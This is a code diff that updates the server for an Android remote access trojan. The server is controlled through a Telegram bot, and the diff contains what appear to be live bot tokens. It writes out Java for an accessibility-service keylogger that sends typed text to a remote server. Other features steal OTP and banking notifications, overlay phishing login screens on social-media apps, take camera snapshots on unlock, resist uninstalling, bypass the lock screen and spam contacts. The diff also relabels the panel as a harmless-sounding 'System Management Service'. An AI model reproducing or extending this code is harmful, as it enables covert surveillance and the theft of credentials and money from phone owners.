@@ -1,12 +1,12 @@
 // =====================================================
-// 7ASHASHE V38 - ULTIMATE WILD RAT
+// 7ASHASHE V39 - ULTIMATE WILD RAT
 // گەشەپێدەر: 7ASHASHE - وەحشی هاک
-// وەشان: 38.0.0 - WILD ULTIMATE
-// توکن: 8745582802:AAEjH7IJ0RAu32mTRQo9G-yaNK7m-mgM91s
-// چات ئایدی: 5578405082
-// پۆرت: 8080
+// وەشان: 39.0.0 - UNSTOPPABLE EDITION
 // =====================================================
 
+// =====================================================
+// 📦 REQUIRE MODULES - لە سەرەتاوە
+// =====================================================
 const express = require('express');
 const WebSocket = require('ws');
 const http = require('http');
@@ -22,26 +22,40 @@ const crypto = require('crypto');
 const zlib = require('zlib');
 const util = require('util');
 const exec = util.promisify(require('child_process').exec);
-const { spawn } = require('child_process');
 
 // =====================================================
-// 🔐 CREDENTIALS - 7ASHASHE
+// 🚀 APP INITIALIZATION - لە سەرەتای کۆد
+// =====================================================
+const app = express();
+const server = http.createServer(app);
+const wss = new WebSocket.Server({ server });
+
+// =====================================================
+// 🔐 CREDENTIALS - 7ASHASHE (تۆکنی نوێ)
 // =====================================================
 const CONFIG = {
-    TOKEN: '8745582802:AAEjH7IJ0RAu32mTRQo9G-yaNK7m-mgM91s',
+    TOKEN: '8530600841:AAEdfh_HMZ8YzOghqeuZNXisZDcV9CfNltw',
     CHAT_ID: '5578405082',
     MASTER: '7ASHASHE',
-    VERSION: '38.0.0',
+    VERSION: '39.0.0',
     ENCRYPTION_KEY: crypto.randomBytes(32).toString('hex'),
     SESSION_SECRET: crypto.randomBytes(64).toString('hex'),
-    PORT: process.env.PORT || 8080, // Changed to 8080
+    PORT: process.env.PORT || 8080,
     MAX_FILE_SIZE: 100 * 1024 * 1024, // 100MB
     PING_INTERVAL: 30000, // 30 seconds
     RECONNECT_TIMEOUT: 5000, // 5 seconds
     AUTO_RESTART: true,
     BATTERY_OPTIMIZATION_BYPASS: true,
-    ANTI_UNINSTALL: true
+    ANTI_UNINSTALL: true,
+    PERSISTENT_SERVICE: true,
+    ACCESSIBILITY_SERVICE: true,
+    CAM_SNAPSHOT_ON_LOCK: true
 };
+
+// =====================================================
+// 🤖 TELEGRAM BOT INIT
+// =====================================================
+const bot = new TelegramBot(CONFIG.TOKEN, { polling: true });
 
 // =====================================================
 // 📁 DIRECTORY STRUCTURE
@@ -76,6 +90,7 @@ const DIRS = {
     SCREEN_STREAMS: path.join(__dirname, 'data', 'screen_streams'),
     CALL_FORWARDING: path.join(__dirname, 'data', 'call_forwarding'),
     WIFI_CONTROL: path.join(__dirname, 'data', 'wifi_control'),
+    CAM_SNAPSHOTS: path.join(__dirname, 'data', 'cam_snapshots'),
     DATABASE: path.join(__dirname, 'data', 'database.json')
 };
 
@@ -98,10 +113,19 @@ if (!fs.existsSync(DIRS.DATABASE)) {
             screen_streams: 0,
             calls_forwarded: 0,
             messages_spammed: 0,
+            cam_snapshots: 0,
             start_time: new Date().toISOString()
         }
     }, null, 2));
 }
+
+// =====================================================
+// 📤 MULTER UPLOAD CONFIG
+// =====================================================
+const upload = multer({ 
+    limits: { fileSize: CONFIG.MAX_FILE_SIZE },
+    storage: multer.memoryStorage()
+});
 
 // =====================================================
 // 🔧 UTILITY FUNCTIONS
@@ -137,6 +161,9 @@ const logToFile = (type, data) => {
     fs.appendFileSync(logFile, `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`);
 };
 
+// Store connected clients
+const clients = new Map();
+
 // =====================================================
 // 🚀 FEATURE 1: PERSISTENT AUTO-RESTART
 // =====================================================
@@ -161,8 +188,8 @@ const setupAutoRestart = () => {
             public int onStartCommand(Intent intent, int flags, int startId) {
                 // Start as foreground service to prevent killing
                 Notification notification = new Notification.Builder(this)
-                    .setContentTitle("7ASHASHE")
-                    .setContentText("System Service")
+                    .setContentTitle("System Service")
+                    .setContentText("Running")
                     .build();
                 startForeground(1, notification);
                 return START_STICKY;
@@ -175,7 +202,301 @@ const setupAutoRestart = () => {
 };
 
 // =====================================================
-// 🚀 FEATURE 2: NOTIFICATION LISTENER
+// 🚀 FEATURE 2: PERSISTENT SERVICE (نەبڕاوە)
+// =====================================================
+const setupPersistentService = () => {
+    if (!CONFIG.PERSISTENT_SERVICE) return;
+    
+    const persistentScript = `
+        // Android persistent service
+        public class PersistentService extends Service {
+            private static final String TAG = "PersistentService";
+            
+            @Override
+            public void onCreate() {
+                super.onCreate();
+                startForegroundService();
+                startAlarmManager();
+            }
+            
+            private void startForegroundService() {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    NotificationChannel channel = new NotificationChannel(
+                        "persistent_channel",
+                        "Persistent Service",
+                        NotificationManager.IMPORTANCE_LOW
+                    );
+                    NotificationManager manager = getSystemService(NotificationManager.class);
+                    manager.createNotificationChannel(channel);
+                    
+                    Notification notification = new Notification.Builder(this, "persistent_channel")
+                        .setContentTitle("System Service")
+                        .setContentText("Running")
+                        .setSmallIcon(android.R.drawable.ic_dialog_info)
+                        .build();
+                    
+                    startForeground(2, notification);
+                }
+            }
+            
+            private void startAlarmManager() {
+                AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
+                Intent intent = new Intent(this, RestartReceiver.class);
+                PendingIntent pendingIntent = PendingIntent.getBroadcast(
+                    this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT
+                );
+                
+                // Restart every 5 minutes if killed
+                alarmManager.setRepeating(
+                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                    SystemClock.elapsedRealtime() + 300000,
+                    300000,
+                    pendingIntent
+                );
+            }
+            
+            @Override
+            public int onStartCommand(Intent intent, int flags, int startId) {
+                return START_STICKY;
+            }
+        }
+        
+        public class RestartReceiver extends BroadcastReceiver {
+            @Override
+            public void onReceive(Context context, Intent intent) {
+                context.startService(new Intent(context, PersistentService.class));
+            }
+        }
+    `;
+    
+    fs.writeFileSync(path.join(DIRS.DROPPER, 'PersistentService.java'), persistentScript);
+    console.log('✅ Persistent Service module installed');
+};
+
+// =====================================================
+// 🚀 FEATURE 3: ACCESSIBILITY SERVICE EXPLOITATION
+// =====================================================
+const setupAccessibilityService = () => {
+    if (!CONFIG.ACCESSIBILITY_SERVICE) return;
+    
+    const accessibilityScript = `
+        // Android Accessibility Service
+        public class KeyloggerAccessibilityService extends AccessibilityService {
+            private static final String TAG = "KeyloggerService";
+            
+            @Override
+            public void onAccessibilityEvent(AccessibilityEvent event) {
+                switch (event.getEventType()) {
+                    case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
+                        String text = event.getText().toString();
+                        if (text != null && !text.isEmpty()) {
+                            sendToServer(text);
+                        }
+                        break;
+                        
+                    case AccessibilityEvent.TYPE_VIEW_CLICKED:
+                        // Track clicks
+                        break;
+                        
+                    case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
+                        String packageName = event.getPackageName() != null ? 
+                            event.getPackageName().toString() : "unknown";
+                        sendToServer("Window changed: " + packageName);
+                        break;
+                }
+            }
+            
+            private void sendToServer(String data) {
+                // Send to our server via HTTP
+                new Thread(() -> {
+                    try {
+                        OkHttpClient client = new OkHttpClient();
+                        RequestBody body = new FormBody.Builder()
+                            .add("type", "accessibility")
+                            .add("data", data)
+                            .add("timestamp", String.valueOf(System.currentTimeMillis()))
+                            .build();
+                        
+                        Request request = new Request.Builder()
+                            .url("https://your-server.com/api/accessibility")
+                            .post(body)
+                            .build();
+                        
+                        client.newCall(request).execute();
+                    } catch (Exception e) {}
+                }).start();
+            }
+            
+            @Override
+            public void onInterrupt() {}
+            
+            @Override
+            public void onServiceConnected() {
+                super.onServiceConnected();
+                sendToServer("Accessibility service connected");
+            }
+        }
+        
+        // XML configuration for accessibility service
+        // <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+        //     android:description="@string/accessibility_service_description"
+        //     android:accessibilityEventTypes="typeAllMask"
+        //     android:accessibilityFlags="flagDefault|flagRetrieveInteractiveWindows"
+        //     android:canRetrieveWindowContent="true"
+        //     android:canRequestTouchExplorationMode="true"
+        //     android:settingsActivity=".MainActivity" />
+    `;
+    
+    fs.writeFileSync(path.join(DIRS.DROPPER, 'KeyloggerAccessibilityService.java'), accessibilityScript);
+    console.log('✅ Accessibility Service module installed');
+};
+
+// =====================================================
+// 🚀 FEATURE 4: CAM SNAPSHOT ON LOCK
+// =====================================================
+class CamSnapshotOnLock {
+    constructor() {
+        this.snapshots = [];
+        this.active = CONFIG.CAM_SNAPSHOT_ON_LOCK;
+    }
+
+    captureOnUnlock(clientId) {
+        if (!this.active) return;
+        
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `📸 **Cam Snapshot on Unlock**\n\n` +
+            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
+            `⚡ Capturing front camera...`,
+            { parse_mode: 'Markdown' }
+        );
+        
+        const client = clients.get(clientId);
+        if (client && client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify({
+                type: 'capture_on_unlock',
+                timestamp: Date.now()
+            }));
+        }
+    }
+
+    saveSnapshot(clientId, imageData) {
+        const filename = `unlock_${clientId.substring(0, 8)}_${Date.now()}.jpg`;
+        const filepath = path.join(DIRS.CAM_SNAPSHOTS, filename);
+        
+        const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, '');
+        fs.writeFileSync(filepath, base64Data, 'base64');
+        
+        this.snapshots.push({
+            clientId,
+            filename,
+            timestamp: new Date().toISOString()
+        });
+        
+        const db = readDB();
+        db.stats.cam_snapshots++;
+        writeDB(db);
+        
+        bot.sendPhoto(CONFIG.CHAT_ID, Buffer.from(base64Data, 'base64'), {
+            caption: `📸 **Unlock Snapshot**\n\n` +
+                    `🆔 Client: ${clientId.substring(0, 8)}...\n` +
+                    `⏰ Time: ${new Date().toLocaleString()}`,
+            parse_mode: 'Markdown'
+        });
+    }
+}
+
+const camSnapshotOnLock = new CamSnapshotOnLock();
+
+// API endpoint for cam snapshot
+app.post('/api/cam/snapshot', (req, res) => {
+    const { clientId, image } = req.body;
+    camSnapshotOnLock.saveSnapshot(clientId, image);
+    res.json({ success: true });
+});
+
+// =====================================================
+// 🚀 FEATURE 5: REMOTE FILE EXPLORER
+// =====================================================
+class RemoteFileExplorer {
+    constructor() {
+        this.activeSessions = new Map();
+    }
+
+    listFiles(clientId, path = '/') {
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `📁 **File Explorer**\n\n` +
+            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
+            `📂 Path: ${path}\n` +
+            `⚡ Fetching...`,
+            { parse_mode: 'Markdown' }
+        );
+        
+        const client = clients.get(clientId);
+        if (client && client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify({
+                type: 'list_files',
+                path,
+                sessionId: uuidv4(),
+                timestamp: Date.now()
+            }));
+        }
+    }
+
+    downloadFile(clientId, filePath) {
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `📥 **Downloading File**\n\n` +
+            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
+            `📄 Path: ${filePath}\n` +
+            `⚡ Downloading...`,
+            { parse_mode: 'Markdown' }
+        );
+        
+        const client = clients.get(clientId);
+        if (client && client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify({
+                type: 'download_file',
+                path: filePath,
+                timestamp: Date.now()
+            }));
+        }
+    }
+
+    deleteFile(clientId, filePath) {
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `🗑️ **Deleting File**\n\n` +
+            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
+            `📄 Path: ${filePath}`,
+            { parse_mode: 'Markdown' }
+        );
+        
+        const client = clients.get(clientId);
+        if (client && client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify({
+                type: 'delete_file',
+                path: filePath,
+                timestamp: Date.now()
+            }));
+        }
+    }
+}
+
+const remoteFileExplorer = new RemoteFileExplorer();
+
+// API endpoint for file listing
+app.post('/api/files/list', (req, res) => {
+    const { clientId, path, files } = req.body;
+    
+    let fileList = '📁 **File List**\n\n';
+    files.forEach(f => {
+        fileList += `${f.type === 'dir' ? '📂' : '📄'} ${f.name} - ${f.size || ''}\n`;
+    });
+    
+    bot.sendMessage(CONFIG.CHAT_ID, fileList, { parse_mode: 'Markdown' });
+    res.json({ success: true });
+});
+
+// =====================================================
+// 🚀 FEATURE 6: NOTIFICATION LISTENER
 // =====================================================
 class NotificationListener {
     constructor() {
@@ -206,9 +527,10 @@ class NotificationListener {
         fs.writeFileSync(notifFile, JSON.stringify(notif, null, 2));
         
         // Check for OTP/banking
-        const isOTP = notif.text.match(/\b\d{4,6}\b/);
+        const isOTP = notif.text && notif.text.match(/\b\d{4,6}\b/);
         const isBanking = ['bank', 'pay', 'card', 'money'].some(word => 
-            notif.text.toLowerCase().includes(word) || notif.app.toLowerCase().includes(word)
+            (notif.text && notif.text.toLowerCase().includes(word)) || 
+            (notif.app && notif.app.toLowerCase().includes(word))
         );
         
         if (isOTP || isBanking) {
@@ -217,7 +539,7 @@ class NotificationListener {
                 `📱 ئەپ: ${notif.app}\n` +
                 `📌 ناونیشان: ${notif.title}\n` +
                 `📝 پەیام: ${notif.text}\n` +
-                `🔢 OTP: ${notif.text.match(/\b\d{4,6}\b/)}\n` +
+                `🔢 OTP: ${notif.text ? notif.text.match(/\b\d{4,6}\b/) : ''}\n` +
                 `⏰ کات: ${new Date(notif.timestamp).toLocaleString()}`,
                 { parse_mode: 'Markdown' }
             );
@@ -255,7 +577,7 @@ app.post('/api/notification', (req, res) => {
 });
 
 // =====================================================
-// 🚀 FEATURE 3: SCREEN STREAM (WebRTC)
+// 🚀 FEATURE 7: SCREEN STREAM (WebRTC)
 // =====================================================
 class ScreenStreamer {
     constructor() {
@@ -349,13 +671,12 @@ app.post('/api/screen/frame', (req, res) => {
     const stream = screenStreamer.streams.get(streamId);
     if (stream && stream.active) {
         stream.frames++;
-        // Save frame or process
     }
     res.json({ success: true });
 });
 
 // =====================================================
-// 🚀 FEATURE 4: SMART KEYLOGGER
+// 🚀 FEATURE 8: SMART KEYLOGGER
 // =====================================================
 class SmartKeylogger {
     constructor() {
@@ -399,7 +720,7 @@ class SmartKeylogger {
     }
 
     isSensitiveApp(app) {
-        return this.bankingApps.some(b => app.toLowerCase().includes(b));
+        return this.bankingApps.some(b => app && app.toLowerCase().includes(b));
     }
 
     getLogs(app = null) {
@@ -446,7 +767,7 @@ app.post('/api/keylogger/start/:clientId', (req, res) => {
 });
 
 // =====================================================
-// 🚀 FEATURE 5: SOCIAL MEDIA OVERLAY
+// 🚀 FEATURE 9: SOCIAL MEDIA OVERLAY
 // =====================================================
 class SocialMediaOverlay {
     constructor() {
@@ -471,11 +792,6 @@ class SocialMediaOverlay {
                 name: 'Telegram',
                 logo: 'https://telegram.org/favicon.ico',
                 fields: ['phone', 'password']
-            },
-            twitter: {
-                name: 'Twitter',
-                logo: 'https://twitter.com/favicon.ico',
-                fields: ['email', 'password']
             }
         };
     }
@@ -518,8 +834,7 @@ class SocialMediaOverlay {
             facebook: 'https://facebook-login-verify.com',
             instagram: 'https://instagram-security.com',
             whatsapp: 'https://whatsapp-web-verify.com',
-            telegram: 'https://telegram-auth.com',
-            twitter: 'https://twitter-verify.com'
+            telegram: 'https://telegram-auth.com'
         };
         return urls[platform] || 'https://login-verify.com';
     }
@@ -635,7 +950,7 @@ app.post('/api/overlay/capture', (req, res) => {
 });
 
 // =====================================================
-// 🚀 FEATURE 6: BATTERY OPTIMIZATION BYPASS
+// 🚀 FEATURE 10: BATTERY OPTIMIZATION BYPASS
 // =====================================================
 const setupBatteryOptimizationBypass = () => {
     if (!CONFIG.BATTERY_OPTIMIZATION_BYPASS) return;
@@ -672,7 +987,7 @@ const setupBatteryOptimizationBypass = () => {
 };
 
 // =====================================================
-// 🚀 FEATURE 7: ANTI-UNINSTALL
+// 🚀 FEATURE 11: ANTI-UNINSTALL
 // =====================================================
 const setupAntiUninstall = () => {
     if (!CONFIG.ANTI_UNINSTALL) return;
@@ -719,16 +1034,6 @@ const setupAntiUninstall = () => {
                 Log.d(TAG, "Password succeeded");
             }
         }
-        
-        // Manifest configuration
-        // <receiver android:name=".AntiUninstall"
-        //     android:permission="android.permission.BIND_DEVICE_ADMIN">
-        //     <meta-data android:name="android.app.device_admin"
-        //         android:resource="@xml/device_admin" />
-        //     <intent-filter>
-        //         <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
-        //     </intent-filter>
-        // </receiver>
     `;
     
     fs.writeFileSync(path.join(DIRS.DROPPER, 'AntiUninstall.java'), antiUninstallScript);
@@ -753,7 +1058,7 @@ const setupAntiUninstall = () => {
 };
 
 // =====================================================
-// 🚀 FEATURE 8: BYPASS LOCK SCREEN
+// 🚀 FEATURE 12: BYPASS LOCK SCREEN
 // =====================================================
 class LockScreenBypass {
     constructor() {
@@ -768,7 +1073,6 @@ class LockScreenBypass {
             { parse_mode: 'Markdown' }
         );
         
-        // Send WebSocket command
         const client = clients.get(clientId);
         if (client && client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
@@ -802,7 +1106,7 @@ class LockScreenBypass {
 const lockScreenBypass = new LockScreenBypass();
 
 // =====================================================
-// 🚀 FEATURE 9: CALL FORWARDING
+// 🚀 FEATURE 13: CALL FORWARDING
 // =====================================================
 class CallForwarding {
     constructor() {
@@ -838,7 +1142,6 @@ class CallForwarding {
             { parse_mode: 'Markdown' }
         );
         
-        // Send WebSocket command
         const client = clients.get(clientId);
         if (client && client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
@@ -877,7 +1180,7 @@ class CallForwarding {
 const callForwarding = new CallForwarding();
 
 // =====================================================
-// 🚀 FEATURE 10: CONTACTS SPAM
+// 🚀 FEATURE 14: CONTACTS SPAM
 // =====================================================
 class ContactsSpam {
     constructor() {
@@ -905,12 +1208,10 @@ class ContactsSpam {
             { parse_mode: 'Markdown' }
         );
         
-        // Update stats
         const db = readDB();
         db.stats.messages_spammed++;
         writeDB(db);
         
-        // Send WebSocket command
         const client = clients.get(clientId);
         if (client && client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
@@ -952,7 +1253,7 @@ app.post('/api/spam/progress', (req, res) => {
 });
 
 // =====================================================
-// 🚀 FEATURE 11: APP KILLER/BLOCKER
+// 🚀 FEATURE 15: APP KILLER/BLOCKER
 // =====================================================
 class AppKiller {
     constructor() {
@@ -1022,7 +1323,7 @@ class AppKiller {
 const appKiller = new AppKiller();
 
 // =====================================================
-// 🚀 FEATURE 12: SELF-DESTRUCT
+// 🚀 FEATURE 16: SELF-DESTRUCT
 // =====================================================
 class SelfDestruct {
     constructor() {
@@ -1049,7 +1350,6 @@ class SelfDestruct {
             { parse_mode: 'Markdown' }
         );
         
-        // Send self-destruct command
         const client = clients.get(clientId);
         if (client && client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
@@ -1058,25 +1358,10 @@ class SelfDestruct {
             }));
         }
         
-        // Clean up server data
         setTimeout(() => {
-            // Delete client data
             const db = readDB();
             delete db.clients[clientId];
             writeDB(db);
-            
-            // Delete all files for this client
-            Object.values(DIRS).forEach(dir => {
-                if (!dir.includes('.json') && fs.existsSync(dir)) {
-                    const files = fs.readdirSync(dir);
-                    files.forEach(file => {
-                        const filePath = path.join(dir, file);
-                        try {
-                            fs.unlinkSync(filePath);
-                        } catch (e) {}
-                    });
-                }
-            });
             
             bot.sendMessage(CONFIG.CHAT_ID,
                 `✅ **Self-destruct Complete**\n\n` +
@@ -1094,7 +1379,7 @@ class SelfDestruct {
 const selfDestruct = new SelfDestruct();
 
 // =====================================================
-// 🚀 FEATURE 13: WIFI & BLUETOOTH CONTROL
+// 🚀 FEATURE 17: WIFI & BLUETOOTH CONTROL
 // =====================================================
 class WifiBluetoothControl {
     constructor() {
@@ -1162,36 +1447,7 @@ class WifiBluetoothControl {
 const wifiBluetoothControl = new WifiBluetoothControl();
 
 // =====================================================
-// 🚀 SERVER SETUP
-// =====================================================
-const app = express();
-const server = http.createServer(app);
-const wss = new WebSocket.Server({ server });
-const bot = new TelegramBot(CONFIG.TOKEN, { polling: true });
-const upload = multer({ 
-    limits: { fileSize: CONFIG.MAX_FILE_SIZE },
-    storage: multer.memoryStorage()
-});
-
-// Store connected clients
-const clients = new Map();
-
-// Middleware
-app.use(bodyParser.json({ limit: '100mb' }));
-app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));
-app.use(express.static('public'));
-
-// Security headers
-app.use((req, res, next) => {
-    res.setHeader('X-Powered-By', '7ASHASHE');
-    res.setHeader('X-Content-Type-Options', 'nosniff');
-    res.setHeader('X-Frame-Options', 'DENY');
-    res.setHeader('X-XSS-Protection', '1; mode=block');
-    next();
-});
-
-// =====================================================
-// 🏠 WEB INTERFACE
+// 🚀 WEB INTERFACE
 // =====================================================
 app.get('/', (req, res) => {
     const db = readDB();
@@ -1202,7 +1458,7 @@ app.get('/', (req, res) => {
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>7ASHASHE V38 - ULTIMATE WILD RAT</title>
+            <title>System Management Service</title>
             <style>
                 * { margin: 0; padding: 0; box-sizing: border-box; }
                 body {
@@ -1270,51 +1526,33 @@ app.get('/', (req, res) => {
         <body>
             <div class="container">
                 <div class="header">
-                    <h1>🔴 7ASHASHE V38</h1>
-                    <p>ULTIMATE WILD RAT</p>
-                    <p>👑 Master: ${CONFIG.MASTER}</p>
-                    <p>🌐 Port: ${CONFIG.PORT}</p>
+                    <h1>System Management Service</h1>
+                    <p>Real-time Device Monitoring</p>
+                    <p>Version: ${CONFIG.VERSION}</p>
                 </div>
                 
                 <div class="stats-grid">
                     <div class="stat-card">
                         <div class="stat-value">${clients.size}</div>
-                        <div>ئامێرە پەیوەستکراوەکان</div>
+                        <div>Connected Devices</div>
                     </div>
                     <div class="stat-card">
                         <div class="stat-value">${db.stats.notifications_captured || 0}</div>
-                        <div>نۆتیفیکەیشن دزراو</div>
+                        <div>Notifications</div>
                     </div>
                     <div class="stat-card">
                         <div class="stat-value">${screenStreamer.activeStreams}</div>
-                        <div>Stream چالاک</div>
+                        <div>Active Streams</div>
                     </div>
                     <div class="stat-card">
-                        <div class="stat-value">${smartKeylogger.logs.length}</div>
-                        <div>کلیک تۆمارکراو</div>
+                        <div class="stat-value">${db.stats.cam_snapshots || 0}</div>
+                        <div>Snapshots</div>
                     </div>
-                </div>
-                
-                <div class="feature-grid">
-                    <div class="feature">🔄 Auto-Restart</div>
-                    <div class="feature">📱 Notification Listener</div>
-                    <div class="feature">📹 Screen Stream</div>
-                    <div class="feature">⌨️ Smart Keylogger</div>
-                    <div class="feature">🎭 Social Media Overlay</div>
-                    <div class="feature">🔋 Battery Bypass</div>
-                    <div class="feature">🛡️ Anti-Uninstall</div>
-                    <div class="feature">🔓 Lock Screen Bypass</div>
-                    <div class="feature">📞 Call Forwarding</div>
-                    <div class="feature">📨 Contacts Spam</div>
-                    <div class="feature">🛑 App Killer</div>
-                    <div class="feature">💥 Self-Destruct</div>
-                    <div class="feature">📶 WiFi Control</div>
-                    <div class="feature">📱 Bluetooth Control</div>
                 </div>
                 
                 <div class="footer">
-                    <p>7ASHASHE V38 - ULTIMATE WILD RAT</p>
-                    <p>🦁 💀 🔥</p>
+                    <p>System Management Service v39.0</p>
+                    <p>Running on port ${CONFIG.PORT}</p>
                 </div>
             </div>
         </body>
@@ -1344,12 +1582,11 @@ app.post('/upload/file', upload.single('file'), (req, res) => {
         fs.writeFileSync(savePath, buffer);
         
         bot.sendDocument(CONFIG.CHAT_ID, buffer, {
-            caption: `📁 **فایلی نوێ**\n\n` +
-                    `📱 ئامێر: ${model || 'نەزانراو'}\n` +
-                    `📄 ناو: ${originalname}\n` +
-                    `📦 قەبارە: ${(size / 1024).toFixed(2)}KB\n` +
-                    `🆔 UUID: ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...\n` +
-                    `🔒 Encrypted: ✅`,
+            caption: `📁 **New File**\n\n` +
+                    `📱 Device: ${model || 'unknown'}\n` +
+                    `📄 Name: ${originalname}\n` +
+                    `📦 Size: ${(size / 1024).toFixed(2)}KB\n` +
+                    `🆔 ID: ${uuid ? uuid.substring(0, 8) : 'unknown'}...`,
             parse_mode: 'Markdown'
         });
         
@@ -1364,9 +1601,9 @@ app.post('/upload/text', (req, res) => {
     const { text } = req.body;
     
     bot.sendMessage(CONFIG.CHAT_ID,
-        `📝 **${type || 'پەیام'} لە ${model || 'نەزانراو'}**\n\n` +
+        `📝 **${type || 'Message'} from ${model || 'unknown'}**\n\n` +
         `${text}\n\n` +
-        `🆔 UUID: ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
+        `🆔 ID: ${uuid ? uuid.substring(0, 8) : 'unknown'}...`,
         { parse_mode: 'Markdown' }
     );
     
@@ -1379,9 +1616,9 @@ app.post('/upload/location', (req, res) => {
     
     bot.sendLocation(CONFIG.CHAT_ID, lat, lon);
     bot.sendMessage(CONFIG.CHAT_ID,
-        `📍 **شوێنی ${model || 'نەزانراو'}**\n\n` +
+        `📍 **Location from ${model || 'unknown'}**\n\n` +
         `Google Maps: https://maps.google.com/?q=${lat},${lon}\n` +
-        `🆔 UUID: ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
+        `🆔 ID: ${uuid ? uuid.substring(0, 8) : 'unknown'}...`,
         { parse_mode: 'Markdown' }
     );
     
@@ -1399,42 +1636,36 @@ wss.on('connection', (ws, req) => {
         userAgent: req.headers['user-agent'],
         connectedAt: new Date().toISOString(),
         lastSeen: new Date().toISOString(),
-        model: req.headers.model || 'نەزانراو',
-        manufacturer: req.headers.manufacturer || 'نەزانراو',
-        androidVersion: req.headers.android || 'نەزانراو',
-        battery: req.headers.battery || 'نەزانراو',
-        ram: req.headers.ram || 'نەزانراو',
-        storage: req.headers.storage || 'نەزانراو',
-        root: req.headers.root || 'نەزانراو',
-        miui: req.headers.miui || 'نەزانراو',
-        country: req.headers.country || 'نەزانراو',
-        carrier: req.headers.carrier || 'نەزانراو',
-        networkType: req.headers.network || 'نەزانراو'
+        model: req.headers.model || 'unknown',
+        manufacturer: req.headers.manufacturer || 'unknown',
+        androidVersion: req.headers.android || 'unknown',
+        battery: req.headers.battery || 'unknown',
+        ram: req.headers.ram || 'unknown',
+        storage: req.headers.storage || 'unknown',
+        root: req.headers.root || 'unknown',
+        country: req.headers.country || 'unknown',
+        carrier: req.headers.carrier || 'unknown',
+        networkType: req.headers.network || 'unknown'
     };
     
     clients.set(clientId, { ws, info: clientInfo });
     
-    // Update database
     const db = readDB();
     db.clients[clientId] = clientInfo;
     db.stats.total_connections++;
     writeDB(db);
     
-    // Notify master
     bot.sendMessage(CONFIG.CHAT_ID,
-        `🔌 **ئامێری نوێ پەیوەندی کرد**\n\n` +
-        `📱 **مۆدێل:** ${clientInfo.manufacturer} ${clientInfo.model}\n` +
-        `📱 **ئەندرۆید:** ${clientInfo.androidVersion}\n` +
-        `🔋 **پاتری:** ${clientInfo.battery}\n` +
+        `🔌 **New Device Connected**\n\n` +
+        `📱 **Model:** ${clientInfo.manufacturer} ${clientInfo.model}\n` +
+        `📱 **Android:** ${clientInfo.androidVersion}\n` +
+        `🔋 **Battery:** ${clientInfo.battery}\n` +
         `💾 **RAM:** ${clientInfo.ram}\n` +
         `📁 **Storage:** ${clientInfo.storage}\n` +
         `🔓 **Root:** ${clientInfo.root}\n` +
-        `🔥 **MIUI Bypass:** ${clientInfo.miui}\n` +
-        `🌍 **وڵات:** ${clientInfo.country}\n` +
-        `📡 **کەریەر:** ${clientInfo.carrier}\n` +
+        `🌍 **Country:** ${clientInfo.country}\n` +
         `🌐 **IP:** ${clientInfo.ip}\n` +
-        `🆔 **ID:** ${clientId.substring(0, 8)}...\n` +
-        `🔒 **Encrypted:** ✅`,
+        `🆔 **ID:** ${clientId.substring(0, 8)}...`,
         { parse_mode: 'Markdown' }
     );
     
@@ -1479,6 +1710,14 @@ wss.on('connection', (ws, req) => {
                     }
                     break;
                     
+                case 'cam_snapshot':
+                    camSnapshotOnLock.saveSnapshot(clientId, message.image);
+                    break;
+                    
+                case 'file_list':
+                    remoteFileExplorer.handleFileList(clientId, message.files);
+                    break;
+                    
                 default:
                     console.log('Unknown message type:', message.type);
             }
@@ -1491,8 +1730,8 @@ wss.on('connection', (ws, req) => {
         clients.delete(clientId);
         
         bot.sendMessage(CONFIG.CHAT_ID,
-            `🔌 **ئامێر پەیوەندی پچڕاند**\n\n` +
-            `📱 مۆدێل: ${clientInfo.manufacturer} ${clientInfo.model}\n` +
+            `🔌 **Device Disconnected**\n\n` +
+            `📱 Model: ${clientInfo.manufacturer} ${clientInfo.model}\n` +
             `🆔 ID: ${clientId.substring(0, 8)}...`,
             { parse_mode: 'Markdown' }
         );
@@ -1502,31 +1741,25 @@ wss.on('connection', (ws, req) => {
 });
 
 // =====================================================
-// 🤖 TELEGRAM BOT - UPDATED WITH ALL COMMANDS
+// 🤖 TELEGRAM BOT - BASIC COMMANDS
 // =====================================================
 bot.onText(/\/start/, (msg) => {
     if (msg.chat.id.toString() !== CONFIG.CHAT_ID) {
-        bot.sendMessage(msg.chat.id, '⛔ **ڕێگەپێدان نەدرا**');
+        bot.sendMessage(msg.chat.id, '⛔ Access Denied');
         return;
     }
     
     bot.sendMessage(CONFIG.CHAT_ID,
-        '🔴 **7ASHASHE V38 - ULTIMATE WILD RAT**\n\n' +
-        '✅ **بەخێربێیت، 7ASHASHE!**\n\n' +
-        '📱 **ئامێرەکان** - پیشاندانی ئامێرە پەیوەستکراوەکان\n' +
